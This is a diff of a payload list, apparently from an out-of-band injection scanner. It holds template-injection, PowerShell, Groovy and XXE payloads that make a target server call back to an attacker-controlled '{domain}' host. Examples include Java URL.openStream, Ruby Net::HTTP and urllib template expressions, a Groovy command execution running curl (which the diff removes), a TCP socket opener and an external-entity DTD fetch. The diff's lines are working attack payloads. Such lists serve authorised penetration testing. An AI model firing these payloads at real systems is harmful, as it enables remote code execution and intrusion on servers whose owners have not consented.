@@ -72,8 +72,6 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 {%import urllib.request%}{{urllib.request.urlopen('http://{domain}/tornado').read()}}
 {fetch file="http://{domain}/smarty"}
 {fetch file="http://{domain}/smarty" assign="x"}
-@php file_get_contents('http://{domain}/blade') @endphp
-@php fopen('http://{domain}/blade','r') @endphp
 <%=require 'net/http';Net::HTTP.get(URI('http://{domain}/erb'))%>
 <%=require 'open-uri';URI.open('http://{domain}/erb').read%>
 =require 'net/http';Net::HTTP.get(URI('http://{domain}/slim'))
@@ -137,7 +135,7 @@ Invoke-WebRequest http://{domain}/pseval
 (New-Object Net.WebClient).DownloadString("http://{domain}/pseval")
 [System.Net.Sockets.TcpClient]::new('{domain}',9999)
 new URL('http://{domain}/groovy').text
-['curl','http://{domain}/groovy'].execute()
+new java.net.URL('http://{domain}/groovy2').openStream()
 "http://{domain}/groovy".toURL().text
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe.dtd">%xxe;]><root>1337</root>
 <hjk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{domain}/xxe" parse="text"/></hjk>
